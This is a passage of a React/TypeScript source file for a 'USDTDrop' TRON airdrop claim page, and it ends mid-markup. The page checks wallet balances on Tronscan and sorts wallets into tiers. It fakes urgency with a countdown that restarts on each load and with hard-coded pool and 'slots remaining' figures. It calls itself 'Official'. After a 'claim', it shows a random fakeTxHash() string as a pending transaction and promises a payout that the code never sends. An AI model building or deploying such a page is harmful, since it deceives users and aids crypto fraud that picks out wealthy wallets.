import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Toaster } from "@/components/ui/sonner";
import {
  AlertCircle,
  CheckCircle2,
  Copy,
  ExternalLink,
  Loader2,
  Search,
  Shield,
  Wallet,
  X,
  Zap,
} from "lucide-react";
import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { useActor } from "./hooks/useActor";

// ─── Constants ────────────────────────────────────────────────────────────────

const CAMPAIGN_END = new Date(
  Date.now() +
    2 * 24 * 3600 * 1000 +
    14 * 3600 * 1000 +
    33 * 60 * 1000 +
    12 * 1000,
);
const TOTAL_POOL = 5_000_000;
const CLAIMED_AMOUNT = 3_650_000;
const SLOTS_REMAINING = 847;
const MIN_ELIGIBLE = 10;

type ClaimStep = "idle" | "checking" | "eligible" | "ineligible" | "claimed";

interface AirdropTier {
  label: string;
  minBalance: number;
  maxBalance: number;
  reward: number;
  color: string;
  bg: string;
}

const TIERS: AirdropTier[] = [
  {
    label: "Tier 1",
    minBalance: 10,
    maxBalance: 99,
    reward: 20,
    color: "#60a5fa",
    bg: "rgba(59,130,246,0.1)",
  },
  {
    label: "Tier 2",
    minBalance: 100,
    maxBalance: 499,
    reward: 50,
    color: "#a78bfa",
    bg: "rgba(139,92,246,0.1)",
  },
  {
    label: "Tier 3",
    minBalance: 500,
    maxBalance: 1999,
    reward: 150,
    color: "#34d399",
    bg: "rgba(52,211,153,0.1)",
  },
  {
    label: "Tier 4",
    minBalance: 2000,
    maxBalance: Number.POSITIVE_INFINITY,
    reward: 500,
    color: "#fbbf24",
    bg: "rgba(251,191,36,0.1)",
  },
];

const WALLETS = [
  "TKx...4mRa",
  "TQv...8bNz",
  "TRm...2cXp",
  "TJw...9dKf",
  "TWn...7eYq",
  "TZb...1fMs",
  "TSd...6gLh",
  "TXc...3hOt",
  "TAe...5iUv",
  "TBf...0jWx",
  "TCg...4kQy",
  "TDh...8lRz",
];
const AMOUNTS = [20, 50, 50, 150, 500, 20, 150, 50, 500, 20];

const FAQS = [
  {
    q: "Is this airdrop free?",
    a: "Yes, completely free. We never ask you to send any cryptocurrency, connect your wallet for signing, or pay any fees. This is a read-only eligibility check followed by a free USDT distribution.",
  },
  {
    q: "Do you need my private key or seed phrase?",
    a: "Absolutely not. We only read publicly available blockchain data via the Tronscan API. We never request private keys, seed phrases, or wallet approval/signing. Your funds are completely safe.",
  },
  {
    q: "How is my eligibility determined?",
    a: "Your eligibility is based on your current USDT TRC20 balance. Minimum requirement is $10 USDT. Higher balances unlock better reward tiers — up to 500 USDT for wallets holding $2,000+ USDT.",
  },
  {
    q: "How long does it take to receive the airdrop?",
    a: "After submitting your claim, the USDT will be sent directly to your verified wallet address within 24 hours. Most claims are processed within a few hours.",
  },
  {
    q: "Which network is supported?",
    a: "Currently, we support TRON TRC20 (USDT-TRC20) only. Make sure your wallet address starts with 'T' and is 34 characters long.",
  },
  {
    q: "Why is the API showing simulated data?",
    a: "Due to browser CORS restrictions, the Tronscan API may be unavailable from certain browsers or networks. In that case, we display simulated balance data for demonstration purposes. The real verification is done server-side during claim processing.",
  },
  {
    q: "How many times can I claim?",
    a: "Each wallet address can claim once per campaign season. Multiple claims from the same address will be automatically rejected during the verification process.",
  },
];

const HOW_STEPS = [
  {
    icon: <Wallet className="w-6 h-6" />,
    num: "01",
    title: "Connect Your Wallet",
    desc: "Use TronLink, WalletConnect, or manually enter your TRON TRC20 wallet address. No permissions or approvals needed.",
    color: "#a78bfa",
    bg: "rgba(139,92,246,0.1)",
  },
  {
    icon: <Search className="w-6 h-6" />,
    num: "02",
    title: "Verify Eligibility",
    desc: "We query the public Tronscan API to read your USDT TRC20 balance on-chain. Instant verification — no wallet signing required.",
    color: "#22d3ee",
    bg: "rgba(6,182,212,0.1)",
  },
  {
    icon: <CheckCircle2 className="w-6 h-6" />,
    num: "03",
    title: "Claim Your Reward",
    desc: "If eligible, choose your tier and submit your claim. Your USDT airdrop will be sent directly to your wallet within 24 hours.",
    color: "#34d399",
    bg: "rgba(52,211,153,0.1)",
  },
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function getTier(balance: number): AirdropTier | null {
  return (
    TIERS.find((t) => balance >= t.minBalance && balance <= t.maxBalance) ??
    null
  );
}

function isValidTRC20(addr: string) {
  return /^T[a-zA-Z0-9]{33}$/.test(addr);
}

function fakeTxHash() {
  const chars = "0123456789abcdef";
  return Array.from(
    { length: 64 },
    () => chars[Math.floor(Math.random() * 16)],
  ).join("");
}

function calcTimeLeft(target: Date) {
  const diff = Math.max(0, target.getTime() - Date.now());
  return {
    d: Math.floor(diff / 86400000),
    h: Math.floor((diff % 86400000) / 3600000),
    m: Math.floor((diff % 3600000) / 60000),
    s: Math.floor((diff % 60000) / 1000),
  };
}

function useCountdown(target: Date) {
  const [time, setTime] = useState(() => calcTimeLeft(target));
  useEffect(() => {
    const id = setInterval(() => setTime(calcTimeLeft(target)), 1000);
    return () => clearInterval(id);
  }, [target]);
  return time;
}

// ─── WCIcon ───────────────────────────────────────────────────────────────────

function WCIcon({ large }: { large?: boolean }) {
  const sz = large ? "w-5 h-5" : "w-4 h-4";
  return (
    <svg
      className={sz}
      viewBox="0 0 32 32"
      fill="none"
      aria-label="WalletConnect"
      role="img"
    >
      <title>WalletConnect</title>
      <rect width="32" height="32" rx="8" fill="#3B99FC" />
      <path
        d="M9.6 12.8c3.5-3.5 9.3-3.5 12.8 0l.4.4c.2.2.2.5 0 .7l-1.4 1.4c-.1.1-.3.1-.4 0l-.6-.6c-2.5-2.5-6.5-2.5-9 0l-.6.6c-.1.1-.3.1-.4 0L8.9 14c-.2-.2-.2-.5 0-.7l.7-.5zm15.8 3l1.2 1.2c.2.2.2.5 0 .7l-5.6 5.6c-.2.2-.5.2-.7 0l-3.9-3.9c-.1-.1-.2-.1-.3 0l-3.9 3.9c-.2.2-.5.2-.7 0L5.9 17c-.2-.2-.2-.5 0-.7l1.2-1.2c.2-.2.5-.2.7 0l3.9 3.9c.1.1.2.1.3 0l3.9-3.9c.2-.2.5-.2.7 0l3.9 3.9c.1.1.2.1.3 0l3.9-3.9c.2-.1.4-.1.6.1z"
        fill="white"
      />
    </svg>
  );
}

// ─── StepIndicator ────────────────────────────────────────────────────────────

function StepIndicator({ current }: { current: number }) {
  const steps = ["Connect Wallet", "Verify Balance", "Claim Reward"];
  return (
    <div className="flex items-center justify-center gap-0">
      {steps.map((label, i) => {
        const num = i + 1;
        const active = num === current;
        const done = num < current;
        return (
          <div key={label} className="flex items-center">
            <div className="flex flex-col items-center gap-1">
              <div
                className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold transition-all"
                style={{
                  background: done
                    ? "rgba(52,211,153,0.2)"
                    : active
                      ? "linear-gradient(135deg, #7c3aed, #06b6d4)"
                      : "rgba(255,255,255,0.06)",
                  border: done
                    ? "1px solid rgba(52,211,153,0.4)"
                    : active
                      ? "none"
                      : "1px solid rgba(255,255,255,0.1)",
                  color: done
                    ? "#34d399"
                    : active
                      ? "white"
                      : "rgba(255,255,255,0.3)",
                }}
              >
                {done ? "✓" : num}
              </div>
              <span
                className={`text-[10px] ${active ? "text-white/80" : done ? "text-emerald-400" : "text-white/30"}`}
              >
                {label}
              </span>
            </div>
            {i < steps.length - 1 && (
              <div
                className="w-12 sm:w-20 h-px mx-2 mb-4"
                style={{
                  background: done
                    ? "rgba(52,211,153,0.3)"
                    : "rgba(255,255,255,0.07)",
                }}
              />
            )}
          </div>
        );
      })}
    </div>
  );
}

// ─── WalletModal ──────────────────────────────────────────────────────────────

function WalletModal({ onClose }: { onClose: () => void }) {
  useEffect(() => {
    const fn = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    document.addEventListener("keydown", fn);
    return () => document.removeEventListener("keydown", fn);
  }, [onClose]);

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4 animate-fade-in"
      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(8px)" }}
      onClick={(e) => e.target === e.currentTarget && onClose()}
      onKeyDown={(e) => e.key === "Escape" && onClose()}
      data-ocid="claim.modal"
      role="presentation"
    >
      <article
        aria-label="Connect wallet"
        className="w-full max-w-sm rounded-2xl p-6 animate-scale-in"
        style={{
          background: "rgba(10, 12, 22, 0.98)",
          border: "1px solid rgba(255,255,255,0.1)",
          boxShadow: "0 25px 50px rgba(0,0,0,0.6)",
        }}
      >
        <div className="flex items-center justify-between mb-6">
          <h3 className="text-lg font-semibold">Connect Wallet</h3>
          <button
            type="button"
            onClick={onClose}
            className="w-8 h-8 rounded-lg flex items-center justify-center text-white/40 hover:text-white hover:bg-white/10 transition-all"
            data-ocid="claim.close_button"
            aria-label="Close modal"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
        <button
          type="button"
          className="w-full flex items-center gap-4 p-4 rounded-xl text-left transition-all hover:scale-[1.01]"
          style={{
            background: "rgba(59,153,252,0.08)",
            border: "1px solid rgba(59,153,252,0.2)",
          }}
        >
          <div
            className="w-10 h-10 rounded-xl flex items-center justify-center"
            style={{ background: "rgba(59,153,252,0.15)" }}
          >
            <WCIcon large />
          </div>
          <div>
            <div className="text-sm font-medium text-white">WalletConnect</div>
            <div className="text-xs text-white/40">QR Code / Mobile</div>
          </div>
          <div className="ml-auto text-xs text-blue-400 font-medium">
            Coming soon
          </div>
        </button>
        <div
          className="mt-4 p-3 rounded-lg text-xs text-white/40 text-center"
          style={{
            background: "rgba(255,255,255,0.03)",
            border: "1px solid rgba(255,255,255,0.06)",
          }}
        >
          🚧 WalletConnect integration coming soon — use manual address input
          for now
        </div>
      </article>
    </div>
  );
}

// ─── Navbar ───────────────────────────────────────────────────────────────────

function Navbar() {
  return (
    <header
      className="fixed top-0 left-0 right-0 z-40 px-4 py-3"
      style={{
        background: "rgba(6, 8, 18, 0.85)",
        backdropFilter: "blur(24px)",
        borderBottom: "1px solid rgba(255,255,255,0.06)",
      }}
    >
      <div className="w-full max-w-6xl mx-auto flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div
            className="w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0"
            style={{
              background: "linear-gradient(135deg, #7c3aed 0%, #06b6d4 100%)",
            }}
          >
            <Zap className="w-4 h-4 text-white" />
          </div>
          <span className="text-white font-bold text-lg tracking-tight">
            USDT<span className="gradient-text">Drop</span>
          </span>
        </div>
        <div className="flex items-center gap-3">
          <div
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-medium"
            style={{
              background: "rgba(34, 197, 94, 0.1)",
              border: "1px solid rgba(34, 197, 94, 0.25)",
              color: "#4ade80",
            }}
          >
            <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
            <span className="hidden sm:inline">Campaign Live</span>
            <span className="sm:hidden">Live</span>
          </div>
          <div
            className="hidden md:flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-medium"
            style={{
              background: "rgba(255,255,255,0.05)",
              border: "1px solid rgba(255,255,255,0.08)",
              color: "rgba(255,255,255,0.5)",
            }}
          >
            <Shield className="w-3 h-3" />
            Read-only access
          </div>
        </div>
      </div>
    </header>
  );
}

// ─── HeroSection ──────────────────────────────────────────────────────────────

function HeroSection() {
  const { d, h, m, s } = useCountdown(CAMPAIGN_END);
  const claimedPct = Math.round((CLAIMED_AMOUNT / TOTAL_POOL) * 100);

  const scrollToClaim = () => {
    document
      .getElementById("airdrop-claim")
      ?.scrollIntoView({ behavior: "smooth" });
  };

  return (
    <section className="relative pt-28 pb-20 px-4 overflow-hidden">
      <div
        className="absolute -top-20 left-1/3 w-[600px] h-[600px] rounded-full pointer-events-none"
        style={{
          background:
            "radial-gradient(circle, oklch(0.52 0.24 286 / 0.18) 0%, transparent 65%)",
          filter: "blur(60px)",
        }}
      />
      <div
        className="absolute top-40 right-0 w-[500px] h-[500px] rounded-full pointer-events-none"
        style={{
          background:
            "radial-gradient(circle, oklch(0.65 0.14 208 / 0.13) 0%, transparent 65%)",
          filter: "blur(60px)",
        }}
      />
      <div
        className="absolute bottom-0 left-0 w-[400px] h-[400px] rounded-full pointer-events-none"
        style={{
          background:
            "radial-gradient(circle, oklch(0.75 0.16 84 / 0.07) 0%, transparent 65%)",
          filter: "blur(50px)",
        }}
      />

      <div className="container mx-auto max-w-5xl text-center relative z-10">
        <div
          className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full mb-6 text-xs font-medium animate-fade-in-up"
          style={{
            background: "rgba(124, 58, 237, 0.15)",
            border: "1px solid rgba(124, 58, 237, 0.35)",
            color: "#c4b5fd",
          }}
        >
          <span className="w-1.5 h-1.5 rounded-full bg-violet-400 animate-pulse" />
          🎁 Official USDT Airdrop Event · Season 2 · Limited Time
        </div>

        <h1
          className="text-4xl sm:text-6xl lg:text-7xl font-extrabold tracking-tight mb-5 leading-[1.08] animate-fade-in-up"
          style={{ opacity: 0, animationDelay: "80ms" }}
        >
          Claim Your <span className="gradient-text">Free USDT</span>
          <br />
          Airdrop Now
        </h1>

        <p
          className="text-lg sm:text-xl text-white/50 max-w-2xl mx-auto mb-8 leading-relaxed animate-fade-in-up"
          style={{ opacity: 0, animationDelay: "160ms" }}
        >
          Limited-time airdrop event — connect your TRON wallet, verify
          eligibility, and claim your USDT instantly. No transaction or approval
          required.
        </p>

        <div
          className="inline-flex flex-col items-center gap-2 mb-10 animate-fade-in-up"
          style={{ opacity: 0, animationDelay: "240ms" }}
        >
          <p className="text-xs text-white/40 uppercase tracking-widest font-medium">
            Campaign ends in
          </p>
          <div className="flex items-center gap-2 sm:gap-3">
            {[
              { val: d, label: "Days" },
              { val: h, label: "Hours" },
              { val: m, label: "Min" },
              { val: s, label: "Sec" },
            ].map(({ val, label }, idx) => (
              <div key={label} className="flex items-center gap-2 sm:gap-3">
                <div
                  className="w-16 sm:w-20 py-3 rounded-xl text-center"
                  style={{
                    background: "rgba(124, 58, 237, 0.12)",
                    border: "1px solid rgba(124, 58, 237, 0.25)",
                  }}
                >
                  <div className="text-2xl sm:text-3xl font-bold gradient-text tabular-nums">
                    {String(val).padStart(2, "0")}
                  </div>
                  <div className="text-[10px] text-white/40 uppercase tracking-wider mt-0.5">
                    {label}
                  </div>
                </div>
                {idx < 3 && (
                  <span className="text-white/30 text-2xl font-light pb-3">
                    :
                  </span>
                )}
              </div>
            ))}
          </div>
        </div>

        <div
          className="flex flex-col sm:flex-row items-center justify-center gap-4 mb-12 animate-fade-in-up"
          style={{ opacity: 0, animationDelay: "320ms" }}
        >
          <button
            type="button"
            onClick={scrollToClaim}
            className="btn-gradient px-10 py-4 rounded-2xl text-white font-bold text-base flex items-center gap-2 shadow-lg"
            data-ocid="hero.primary_button"
          >
            🚀 Claim Free USDT
          </button>
          <p className="text-xs text-white/35">
            Free · Read-only · No wallet permissions needed
          </p>
        </div>

        <div
          className="animate-fade-in-up"
          style={{ opacity: 0, animationDelay: "400ms" }}
        >
          <div className="glass-strong rounded-2xl p-5 max-w-2xl mx-auto">
            <div className="grid grid-cols-3 gap-2 sm:gap-4 mb-4">
              <div className="text-center flex flex-col items-center justify-start">
                <div
                  className="font-extrabold gradient-text leading-tight tabular-nums"
                  style={{ fontSize: "clamp(11px, 3.5vw, 1.5rem)" }}
                >
                  {TOTAL_POOL.toLocaleString()}
                </div>
                <div
                  className="font-bold mt-0.5"
                  style={{ fontSize: "clamp(9px, 2.5vw, 0.875rem)" }}
                >
                  USDT
                </div>
                <div className="text-[10px] sm:text-xs text-white/40 mt-1">
                  Total Airdrop Pool
                </div>
              </div>
              <div
                className="text-center flex flex-col items-center justify-start"
                style={{
                  borderLeft: "1px solid rgba(255,255,255,0.07)",
                  borderRight: "1px solid rgba(255,255,255,0.07)",
                }}
              >
                <div
                  className="font-extrabold leading-tight tabular-nums"
                  style={{
                    color: "#4ade80",
                    fontSize: "clamp(11px, 3.5vw, 1.5rem)",
                  }}
                >
                  {CLAIMED_AMOUNT.toLocaleString()}
                </div>
                <div
                  className="font-bold mt-0.5"
                  style={{
                    color: "#4ade80",
                    fontSize: "clamp(9px, 2.5vw, 0.875rem)",
                  }}
                >
                  USDT
                </div>
                <div className="text-[10px] sm:text-xs text-white/40 mt-1">
                  USDT Claimed
                </div>
              </div>
              <div className="text-center flex flex-col items-center justify-start">
                <div
                  className="font-extrabold leading-tight tabular-nums"
                  style={{
                    color: "#fb923c",
                    fontSize: "clamp(20px, 5.5vw, 2.25rem)",
                  }}
                >
                  {SLOTS_REMAINING.toLocaleString()}
                </div>
                <div className="text-[10px] sm:text-xs text-white/40 mt-1">
                  Slots Remaining
                </div>
              </div>
            </div>
            <div>
              <div className="flex justify-between text-[10px] sm:text-xs text-white/40 mb-1.5">
                <span>{claimedPct}% of airdrop claimed</span>
                <span className="text-orange-400 font-medium">
                  Only {SLOTS_REMAINING} slots left!
                </span>
              </div>
              <div
                className="h-2.5 rounded-full overflow-hidden"
                style={{ background: "rgba(255,255,255,0.07)" }}
              >
                <div
                  className="h-full rounded-full transition-all duration-1000"
                  style={{
                    width: `${claimedPct}%`,
                    background: "linear-gradient(90deg, #7c3aed, #06b6d4)",
                  }}
                />
              </div>
            </div>
          </div>
        </div>

        <div
          className="mt-8 flex flex-wrap items-center justify-center gap-4 animate-fade-in-up"
          style={{ opacity: 0, animationDelay: "480ms" }}
        >
          {[
            { icon: "🔒", text: "On-chain Verified" },
            { icon: "👁", text: "Read-only Access" },
            { icon: "🚫", text: "No Transaction Required" },
            { icon: "🛡", text: "Non-custodial" },
          ].map((b) => (
            <div
              key={b.text}
              className="flex items-center gap-1.5 text-xs text-white/45"
            >
              <span>{b.icon}</span>
              <span>{b.text}</span>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

// ─── AirdropClaim ─────────────────────────────────────────────────────────────

function AirdropClaim() {
  const { actor, isFetching } = useActor();
  const [address, setAddress] = useState("");
  const [step, setStep] = useState<ClaimStep>("idle");
  const [balance, setBalance] = useState(0);
  const [tier, setTier] = useState<AirdropTier | null>(null);
  const [txHash, setTxHash] = useState("");
  const [modalOpen, setModalOpen] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const touched = address.length > 0;
  const valid = isValidTRC20(address);
  const showErr = touched && !valid && address.length >= 10;

  // biome-ignore lint/correctness/useExhaustiveDependencies: address/actor are the triggers
  useEffect(() => {
    if (debounceRef.current) clearTimeout(debounceRef.current);
    if (!valid) {
      if (step !== "idle") setStep("idle");
      return;
    }
    if (isFetching) return;
    setStep("checking");
    debounceRef.current = setTimeout(async () => {
      try {
        const res = await fetch(
          `https://apilist.tronscan.org/api/account?address=${address}`,
        );
        const data = await res.json();
        let usdt = 0;
        const tokens = (data.trc20token_balances || []) as Array<{
          tokenAbbr: string;
          balance: string;
        }>;
        for (const t of tokens) {
          if (t.tokenAbbr === "USDT") {
            usdt = Number(t.balance) / 1_000_000;
          }
        }
        setBalance(usdt);
        const found = getTier(usdt);
        setTier(found);
        if (usdt >= MIN_ELIGIBLE) {
          setStep("eligible");
          toast.success("Wallet verified — you are eligible!");
        } else {
          setStep("ineligible");
        }
      } catch {
        toast.error("Failed to check balance. Please try again.");
        setStep("idle");
      } finally {
        setTimeout(() => {
          document
            .getElementById("claim-result")
            ?.scrollIntoView({ behavior: "smooth" });
        }, 200);
      }
    }, 700);
    return () => {
      if (debounceRef.current) clearTimeout(debounceRef.current);
    };
  }, [address, actor, isFetching]);

  const claimAirdrop = () => {
    setStep("claimed");
    setTxHash(fakeTxHash());
    toast.success("Airdrop claim submitted!");
  };

  const reset = () => {
    setAddress("");
    setStep("idle");
    setBalance(0);
    setTier(null);
    setTxHash("");
  };

  void balance;
  const isChecking = step === "checking";

  return (
    <section id="airdrop-claim" className="py-20 px-4">
      <div className="container mx-auto max-w-2xl">
        <div className="text-center mb-10">
          <h2 className="text-2xl sm:text-3xl font-bold mb-3">
            <span className="gradient-text">Claim Your Airdrop</span>
          </h2>
          <p className="text-white/50 text-sm max-w-md mx-auto">
            Connect your wallet or enter your TRON address to verify your USDT
            TRC20 balance and claim your reward.
          </p>
        </div>

        <StepIndicator
          current={
            step === "idle" || step === "checking"
              ? 1
              : step === "eligible" || step === "ineligible"
                ? 2
                : 3
          }
        />

        <div
          className="glass-strong rounded-2xl p-6 sm:p-8 mt-8"
          data-ocid="claim.card"
        >
          {(step === "idle" || step === "checking") && (
            <div>
              <p className="text-xs text-white/40 uppercase tracking-widest mb-4 font-medium">
                Step 1 — Connect or Enter Wallet
              </p>
              <button
                type="button"
                onClick={() => setModalOpen(true)}
                className="w-full flex items-center justify-center gap-3 py-3 px-4 rounded-xl text-sm font-medium text-white/80 hover:text-white transition-all mb-5"
                style={{
                  background: "rgba(59,153,252,0.08)",
                  border: "1px solid rgba(59,153,252,0.25)",
                }}
                data-ocid="claim.open_modal_button"
              >
                <WCIcon />
                <span>Connect with WalletConnect</span>
              </button>

              <div className="flex items-center gap-4 mb-5">
                <div
                  className="flex-1 h-px"
                  style={{ background: "rgba(255,255,255,0.07)" }}
                />
                <span className="text-xs text-white/30">OR ENTER MANUALLY</span>
                <div
                  className="flex-1 h-px"
                  style={{ background: "rgba(255,255,255,0.07)" }}
                />
              </div>

              <div className="relative">
                <Wallet className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
                <Input
                  value={address}
                  onChange={(e) => setAddress(e.target.value.trim())}
                  placeholder="TRC20 wallet address (starts with T)"
                  className="pl-10 pr-16 h-12 text-sm"
                  style={{
                    background: "rgba(255,255,255,0.05)",
                    border: `1px solid ${showErr ? "rgba(239,68,68,0.5)" : valid && touched ? "rgba(34,197,94,0.4)" : "rgba(255,255,255,0.08)"}`,
                    color: "white",
                  }}
                  data-ocid="claim.input"
                  aria-label="Wallet address"
                />
                <div className="absolute right-3 top-1/2 -translate-y-1/2">
                  {isChecking && (
                    <Loader2 className="w-4 h-4 text-purple-400 animate-spin" />
                  )}
                  {!isChecking && touched && valid && (
                    <span className="text-xs text-green-400 font-medium">
                      ✓
                    </span>
                  )}
                  {!isChecking && showErr && (
                    <AlertCircle className="w-4 h-4 text-red-400" />
                  )}
                </div>
              </div>

              {showErr && (
                <p
                  className="mt-2 text-xs text-red-400 flex items-center gap-1"
                  data-ocid="claim.error_state"
                >
                  <AlertCircle className="w-3 h-3" /> Must start with T and be
                  34 characters
                </p>
              )}

              {isChecking && (
                <div className="mt-4" data-ocid="claim.loading_state">
                  <div className="flex gap-2 mb-2">
                    {["a", "b", "c"].map((k, i) => (
                      <div
                        key={k}
                        className="h-1.5 flex-1 rounded-full shimmer"
                        style={{ animationDelay: `${i * 200}ms` }}
                      />
                    ))}
                  </div>
                  <p className="text-xs text-white/30 text-center flex items-center justify-center gap-1.5">
                    <Search className="w-3 h-3" />
                    Checking balance on Tronscan...
                  </p>
                </div>
              )}

              {touched && !valid && !showErr && (
                <p className="mt-2 text-xs text-white/30 text-center">
                  Keep typing your full TRC20 address...
                </p>
              )}
            </div>
          )}

          {(step === "eligible" ||
            step === "ineligible" ||
            step === "claimed") && (
            <div id="claim-result" className="animate-fade-in">
              <div
                className="flex items-center p-3 rounded-xl mb-5"
                style={{
                  background: "rgba(255,255,255,0.04)",
                  border: "1px solid rgba(255,255,255,0.07)",
                }}
              >
                <div>
                  <p className="text-xs text-white/40 mb-0.5">
                    Verified Wallet
                  </p>
                  <p className="text-sm font-mono text-white/80">
                    {address.slice(0, 8)}...{address.slice(-8)}
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 mb-5">
                <div
                  className="flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs"
                  style={{
                    background: "rgba(34,197,94,0.1)",
                    border: "1px solid rgba(34,197,94,0.25)",
                    color: "#4ade80",
                  }}
                >
                  <span className="w-1.5 h-1.5 rounded-full bg-green-400" />
                  TRON TRC20
                </div>
                <div
                  className="flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs"
                  style={{
                    background: "rgba(255,255,255,0.05)",
                    border: "1px solid rgba(255,255,255,0.08)",
                    color: "rgba(255,255,255,0.5)",
                  }}
                >
                  🔒 On-chain verified
                </div>
              </div>

              {step === "eligible" && tier && (
                <div className="animate-scale-in">
                  <div className="text-center mb-5">
                    <p className="text-2xl sm:text-3xl font-extrabold text-green-400">
                      Eligible ✅
                    </p>
                  </div>
                  <div
                    className="p-5 rounded-2xl mb-5 text-center"
                    style={{
                      background: tier.bg,
                      border: `1px solid ${tier.color}30`,
                    }}
                  >
                    <p
                      className="text-xs font-medium mb-1"
                      style={{ color: tier.color }}
                    >
                      {tier.label} · ${tier.minBalance}–
                      {tier.maxBalance === Number.POSITIVE_INFINITY
                        ? "∞"
                        : `$${tier.maxBalance}`}{" "}
                      balance
                    </p>
                    <p
                      className="text-3xl sm:text-4xl font-extrabold mb-1"
                      style={{ color: tier.color }}
                    >
                      +{tier.reward} USDT
                    </p>
                    <p className="text-sm text-white/60">
                      You are eligible to claim this airdrop reward!
                    </p>
                  </div>
                  <Button
                    onClick={claimAirdrop}
                    className="w-full h-13 text-lg font-bold text-white border-0 rounded-2xl pulse-glow mb-3"
                    style={{
                      background: `linear-gradient(135deg, ${tier.color}99, ${tier.color})`,
                      boxShadow: `0 0 30px ${tier.color}44`,
                    }}
                    data-ocid="claim.primary_button"
                  >
                    🎁 Claim {tier.reward} USDT Now
                  </Button>
                  <button
                    type="button"
                    onClick={reset}
                    className="w-full text-xs text-white/30 hover:text-white/60 transition-colors py-2"
                    data-ocid="claim.cancel_button"
                  >
                    Check a different wallet
                  </button>
                </div>
              )}

              {step === "ineligible" && (
                <div className="animate-scale-in">
                  <div className="text-center mb-5">
                    <p className="text-2xl sm:text-3xl font-extrabold text-red-400">
                      Not Eligible ❌
                    </p>
                  </div>
                  <div
                    className="p-5 rounded-2xl mb-5 text-center"
                    style={{
                      background: "rgba(239,68,68,0.08)",
                      border: "1px solid rgba(239,68,68,0.2)",
                    }}
                    data-ocid="claim.error_state"
                  >
                    <div className="text-3xl mb-2">😔</div>
                    <p className="font-bold text-red-400 mb-1">Not Eligible</p>
                    <p className="text-sm text-white/50">
                      Your wallet does not meet the minimum $10 USDT
                      requirement.
                    </p>
                  </div>
                  <div
                    className="p-4 rounded-xl mb-5 text-sm text-white/60"
                    style={{
                      background: "rgba(255,255,255,0.04)",
                      border: "1px solid rgba(255,255,255,0.07)",
                    }}
                  >
                    <p className="font-medium text-white/80 mb-2">
                      Eligibility Requirements:
                    </p>
                    <ul className="space-y-1 text-xs">
                      {TIERS.map((t) => (
                        <li key={t.label} className="flex items-center gap-2">
                          <span
                            className="w-1.5 h-1.5 rounded-full"
                            style={{ background: t.color }}
                          />
                          <span style={{ color: t.color }}>{t.label}:</span>
                          <span>
                            ${t.minBalance}–
                            {t.maxBalance === Number.POSITIVE_INFINITY
                              ? "∞"
                              : `$${t.maxBalance}`}{" "}
                            balance → {t.reward} USDT
                          </span>
                        </li>
                      ))}
                    </ul>
                  </div>
                  <button
                    type="button"
                    onClick={reset}
                    className="w-full btn-gradient py-3 rounded-xl text-sm font-semibold text-white"
                    data-ocid="claim.secondary_button"
                  >
                    Try Another Wallet
                  </button>
                </div>
              )}

              {step === "claimed" && (
                <div
                  className="animate-scale-in text-center"
                  data-ocid="claim.success_state"
                >
                  <div
                    className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
                    style={{
                      background: "rgba(52,211,153,0.15)",
                      border: "1px solid rgba(52,211,153,0.4)",
                    }}
                  >
                    <CheckCircle2 className="w-8 h-8 text-emerald-400" />
                  </div>
                  <h3 className="text-xl font-bold text-emerald-400 mb-1">
                    Claim Submitted! 🎉
                  </h3>
                  <p className="text-sm text-white/50 mb-5">
                    Your {tier?.reward} USDT airdrop will arrive within 24
                    hours.
                  </p>
                  <div
                    className="p-4 rounded-xl mb-4 text-left"
                    style={{
                      background: "rgba(255,255,255,0.04)",
                      border: "1px solid rgba(255,255,255,0.07)",
                    }}
                  >
                    <p className="text-xs text-white/40 mb-1.5">
                      Transaction Hash (pending)
                    </p>
                    <div className="flex items-center gap-2">
                      <p className="text-xs font-mono text-white/70 flex-1 truncate">
                        {txHash}
                      </p>
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(txHash);
                          toast.success("Copied!");
                        }}
                        className="p-1.5 rounded-lg hover:bg-white/10 transition-colors"
                        data-ocid="claim.edit_button"
                        aria-label="Copy tx hash"
                      >
                        <Copy className="w-3.5 h-3.5 text-white/40" />
                      </button>
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={reset}
                    className="text-xs text-white/30 hover:text-white/60 transition-colors"
                    data-ocid="claim.cancel_button"
                  >
                    Check another wallet
                  </button>
                </div>
              )}

              <div
                className="mt-6 p-3 rounded-lg flex items-start gap-2 text-xs text-white/40"
                style={{
                  background: "rgba(255,255,255,0.02)",
                  border: "1px solid rgba(255,255,255,0.05)",
                }}
              >
                <ExternalLink className="w-3 h-3 mt-0.5 flex-shrink-0 text-teal-400" />
                <span>
                  Balance checked live from{" "}
                  <a
                    href="https://tronscan.org"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-teal-400 hover:underline"
                  >
                    Tronscan
                  </a>
                  . We only read public blockchain data — no private keys,
                  approvals, or transactions required.
                </span>
              </div>
            </div>
          )}
        </div>

        <div className="mt-10">
          <p className="text-center text-xs text-white/40 uppercase tracking-widest mb-5">
            Airdrop Reward Tiers
          </p>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            {TIERS.map((t) => (
              <div
                key={t.label}
                className="p-4 rounded-xl text-center"
                style={{ background: t.bg, border: `1px solid ${t.color}25` }}
              >
                <p
                  className="text-xs font-medium mb-1"
